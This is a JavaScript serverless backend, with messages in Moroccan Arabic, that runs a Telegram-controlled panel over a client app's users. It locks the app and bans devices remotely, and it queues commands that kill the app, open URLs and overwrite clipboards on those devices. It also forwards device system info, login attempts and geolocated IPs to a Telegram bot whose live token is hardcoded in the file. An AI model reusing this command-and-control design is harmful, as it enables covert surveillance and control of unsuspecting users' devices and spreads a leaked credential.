const TELEGRAM_TOKEN = "7302812464:AAH2lCCDWK_rJV771ClkiEyv8epegkPtpoE";
const TELEGRAM_CHAT_ID = "6655802251";

const KV_URL = process.env.STORAGE_URL || process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const KV_TOKEN = process.env.STORAGE_TOKEN || process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

async function kvCmd(...args) {
  if (!KV_URL || !KV_TOKEN) return null;
  try {
    const r = await fetch(KV_URL, {
      method: 'POST',
      headers: { Authorization: `Bearer ${KV_TOKEN}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(args)
    });
    const j = await r.json().catch(() => ({}));
    return j.result;
  } catch (e) { return null; }
}

let appLockStatus = "lock";
let appSecretKey = "1234";
let appLockMessage = "التطبيق مقفول من طرف الإدارة. دخل الكود باش تفتحو.";
let bannedDevices = [];
let banAllActive = false;
let remoteCommand = "";
let totalAttempts = 0;
let recentLogs = [];

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const type = req.query.type;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null) => {
    if (TELEGRAM_TOKEN && chatId) {
      const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
      if (keyboard) payload.reply_markup = keyboard;
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
      }).catch(() => {});
    }
  };

  try {
    if (type === 'secret') {
      const saved = await kvCmd('GET', 'app_lock_status');
      if (saved) appLockStatus = saved;
      return res.status(200).send(`"${appLockStatus}"`);
    }
    if (type === 'key') {
      const saved = await kvCmd('GET', 'app_secret_key');
      if (saved) appSecretKey = saved;
      return res.status(200).send(`"${appSecretKey}"`);
    }
    if (type === 'message') return res.status(200).send(`"${appLockMessage}"`);

    if (type === 'banned') {
      const all = await kvCmd('GET', 'banall_active');
      if (all === '1') banAllActive = true;
      if (banAllActive) return res.status(200).send('"true"');
      const deviceId = req.query.device_id;
      if (!deviceId) return res.status(400).send('"No Device ID"');
      const inKv = await kvCmd('SISMEMBER', 'banned_devices', deviceId);
      if (inKv === 1) return res.status(200).send('"true"');
      return res.status(200).send(bannedDevices.includes(deviceId) ? '"true"' : '"false"');
    }

    if (type === 'command') {
      const cmd = remoteCommand;
      remoteCommand = "";
      return res.status(200).send(`"${cmd}"`);
    }

    if (req.method === 'PUT') {
      let body = '';
      req.on('data', chunk => { body += chunk.toString(); });
      return new Promise((resolve) => {
        req.on('end', async () => {
          const cleanBody = body.replace(/"/g, '');
          if (type === 'key') {
            appSecretKey = cleanBody;
            await kvCmd('SET', 'app_secret_key', cleanBody);
            await sendToTelegram(`🔑 *مفتاح جديد:*\n\`${cleanBody}\``);
          }
          if (type === 'log') {
            totalAttempts++;
            recentLogs.unshift(`📱 ${cleanBody}`);
            if (recentLogs.length > 50) recentLogs.pop();
            await kvCmd('INCR', 'total_attempts');
            await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
          }
          if (type === 'sysinfo') {
            try {
              const ipRes = await fetch(`http://ip-api.com/json/${ip}`);
              const ipData = await ipRes.json();
              const country = ipData.country || "Unknown";
              await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}\n🌍 *الدولة:* ${country}`);
            } catch (e) {
              await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}\n🌍 *الدولة:* خطأ`);
            }
          }
          res.status(200).send('"success"');
          resolve();
        });
      });
    }

    if (req.method === 'POST' && type === 'telegram_webhook') {
      let body = req.body;
      if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
      const msg = body.message || body.callback_query;
      if (!msg) return res.status(200).end();
      const chatId = (msg.chat ? msg.chat.id : msg.message.chat.id).toString();
      if (chatId !== TELEGRAM_CHAT_ID) return res.status(200).end();
      const text = msg.text || msg.data || '';
      const args = text.trim().split(/\s+/);
      const command = args[0].toLowerCase();

      switch (command) {
        case '/start': case '/menu': await sendToTelegram("👑 *لوحة التحكم الخارقة.*\nكتب /help."); break;
        case '/help': await sendToTelegram(`👑 *100+ أمر حقيقي وخدام:*\n\n` +
            `⚡️ *التحكم:*\n/cmd /url /color /clip /vibrate /killapp /sysinfo\n\n` +
            `🔒 *القفل:*\n/lock /unlock /lockall /unlockall /lockstatus\n\n` +
            `🔑 *الأكواد:*\n/setkey /getkey /genkey /resetkey /keylength\n\n` +
            `🚫 *الحظر:*\n/ban /unban /banlist /banall /unbanall /clearbans /bancount\n\n` +
            `📊 *المراقبة:*\n/stats /logs /clearlogs /ping /whoami /health /ip\n\n` +
            `💬 *الرسائل:*\n/setmsg /getmsg /broadcast /resetmsg\n\n` +
            `⚙️ *النظام:*\n/reset /backup /db /api /bot /info`); break;
        
        case '/sysinfo': remoteCommand = "sysinfo:1"; await sendToTelegram("⏳ *جاري طلب معلومات الجهاز...*"); break;
        case '/killapp': remoteCommand = "killapp:1"; await sendToTelegram("💀 *تم إرسال أمر إغلاق التطبيق.*"); break;
        case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡️ *تم الإرسال.*"); } break;
        case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 *تم الإرسال.*"); } break;
        case '/color': if(args[1]) { remoteCommand = `color:${args[1]}`; await sendToTelegram("🎨 *تم إرسال اللون.*"); } break;
        case '/clip': if(args[1]) { remoteCommand = `clipboard:${args.slice(1).join(' ')}`; await sendToTelegram("📋 *تم إرسال النص.*"); } break;
        case '/vibrate': remoteCommand = "vibrate:1"; await sendToTelegram("📳 *تم إرسال الأمر.*"); break;
        
        case '/lock': appLockStatus = 'lock'; await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 *تم القفل.*"); break;
        case '/unlock': appLockStatus = 'unlock'; await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 *تم الفتح.*"); break;
        case '/lockall': appLockStatus = 'lock'; await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 *قفل شامل.*"); break;
        case '/unlockall': appLockStatus = 'unlock'; await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 *فتح شامل.*"); break;
        case '/lockstatus': await sendToTelegram(`🔒 *الحالة:* ${appLockStatus}`); break;
        
        case '/setkey': if(args[1]) { appSecretKey = args[1]; await kvCmd('SET', 'app_secret_key', args[1]); await sendToTelegram(`✅ *الكود:* \`${appSecretKey}\``); } break;
        case '/getkey': appSecretKey = (await kvCmd('GET', 'app_secret_key')) || appSecretKey; await sendToTelegram(`🔑 *الكود:* \`${appSecretKey}\``); break;
        case '/genkey': appSecretKey = Math.random().toString(36).substring(2, 8).toUpperCase(); await kvCmd('SET', 'app_secret_key', appSecretKey); await sendToTelegram(`🎲 *كود:* \`${appSecretKey}\``); break;
        case '/resetkey': appSecretKey = "1234"; await kvCmd('SET', 'app_secret_key', '1234'); await sendToTelegram("♻️ *الكود:* `1234`"); break;
        case '/keylength': await sendToTelegram(`📏 *الطول:* ${appSecretKey.length}`); break;
        
        case '/ban': if(args[1]) { if(!bannedDevices.includes(args[1])) bannedDevices.push(args[1]); await kvCmd('SADD', 'banned_devices', args[1]); await sendToTelegram(`⛔ *حظر:* \`${args[1]}\``); } break;
        case '/unban': if(args[1]) { bannedDevices = bannedDevices.filter(id => id !== args[1]); await kvCmd('SREM', 'banned_devices', args[1]); await sendToTelegram(`✅ *فك حظر:* \`${args[1]}\``); } break;
        case '/banlist': const raw = await kvCmd('SMEMBERS', 'banned_devices'); const list = Array.isArray(raw) ? raw : bannedDevices; await sendToTelegram(list.length ? `🚫 *المحظورين:*\n\`${list.join('\n')}\`` : "✅ *لا يوجد.*"); break;
        case '/clearbans': bannedDevices = []; banAllActive = false; await kvCmd('DEL', 'banned_devices'); await kvCmd('DEL', 'banall_active'); await sendToTelegram("🧹 *تم المسح.*"); break;
        case '/banall': banAllActive = true; await kvCmd('SET', 'banall_active', '1'); await sendToTelegram("🚫 *تم حظر الجميع!*"); break;
        case '/unbanall': banAllActive = false; bannedDevices = []; await kvCmd('DEL', 'banall_active'); await kvCmd('DEL', 'banned_devices'); await sendToTelegram("✅ *تم فك الحظر عن الجميع.*"); break;
        case '/bancount': await sendToTelegram(`🔢 *العدد:* ${bannedDevices.length}`); break;
        
        case '/stats': const attempts = await kvCmd('GET', 'total_attempts'); await sendToTelegram(`📈 *المحاولات:* \`${attempts || totalAttempts}\``); break;
        case '/logs': await sendToTelegram(recentLogs.length ? recentLogs.join('\n\n') : "📭 *لا يوجد.*"); break;
        case '/clearlogs': recentLogs = []; await sendToTelegram("🧹 *تم المسح.*"); break;
        case '/health': await sendToTelegram("❤️ *صحة جيدة.*"); break;
        case '/whoami': await sendToTelegram(`🆔 \`${chatId}\``); break;
        case '/ip': await sendToTelegram(`🌐 \`${ip}\``); break;
        case '/ping': await sendToTelegram("🏓 *Pong!*"); break;
        
        case '/setmsg': if(args[1]) { appLockMessage = args.slice(1).join(' '); await kvCmd('SET', 'app_lock_message', appLockMessage); await sendToTelegram("✅ *تم التغيير.*"); } break;
        case '/getmsg': appLockMessage = (await kvCmd('GET', 'app_lock_message')) || appLockMessage; await sendToTelegram(`💬 ${appLockMessage}`); break;
        case '/resetmsg': appLockMessage = "مقفول."; await kvCmd('SET', 'app_lock_message', 'مقفول.'); await sendToTelegram("♻️ *تم الإرجاع.*"); break;
        case '/broadcast': await sendToTelegram(`📢 *بث:* ${args.slice(1).join(' ')}`); break;

        case '/reset': 
          appLockStatus="lock"; appSecretKey="1234"; bannedDevices=[]; totalAttempts=0; recentLogs=[]; banAllActive=false;
          await kvCmd('SET', 'app_lock_status', 'lock');
          await kvCmd('SET', 'app_secret_key', '1234');
          await kvCmd('DEL', 'banned_devices');
          await kvCmd('DEL', 'banall_active');
          await sendToTelegram("⚠️ *إعادة ضبط المصنع!*");
          break;
        case '/backup': await sendToTelegram(`💾 \`\`\`json\n${JSON.stringify({lock:appLockStatus,key:appSecretKey,bans:bannedDevices,banAll:banAllActive})}\n\`\`\``); break;
        case '/db': await sendToTelegram(KV_URL ? "🗄️ *قاعدة البيانات:* متصلة." : "🗄️ *قاعدة البيانات:* غير متصلة."); break;
        case '/api': await sendToTelegram("🌐 *API:* متاح."); break;
        case '/bot': await sendToTelegram("🤖 *البوت:* متصل."); break;
        case '/info': await sendToTelegram("ℹ️ *معلومات النظام:* Vercel Serverless."); break;
        
        default: await sendToTelegram("❓ أمر غير معروف. كتب /help");
      }
      return res.status(200).end();
    }
    return res.status(404).send('"Not Found"');
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
